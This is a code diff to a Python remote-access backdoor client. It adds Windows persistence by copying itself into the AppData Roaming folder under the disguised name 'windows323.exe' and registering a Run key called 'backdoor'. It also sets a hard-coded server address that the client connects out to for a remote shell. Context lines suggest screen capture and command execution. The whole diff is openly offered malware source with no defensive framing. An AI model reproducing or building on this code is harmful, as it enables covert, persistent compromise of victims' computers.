@@ -5,16 +5,30 @@ import subprocess
 import requests
 import mss
 import time
-
+import shutil
+import sys
 class Client():
     def __init__(self):
-        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.serverIp = '192.168.0.62'
         self.admin = None
+        self.createPersistence()
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection()
 
     # connect server
     def connect(self):
-        self.client.connect(('192.168.56.1', 7777))
+        self.client.connect((self.serverIp, 7777))
+
+    # windows persistence
+    def createPersistence(self):
+        # stored inside Roaming folder
+        location = os.environ['appdata'] +'\\windows323.exe'
+        if not os.path.exists(location):
+            # copy this file on infected client
+            shutil.copyfile(sys.executable, location)
+            # add to register - backdoor = register name
+            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
 
     # listening
     def shell(self):
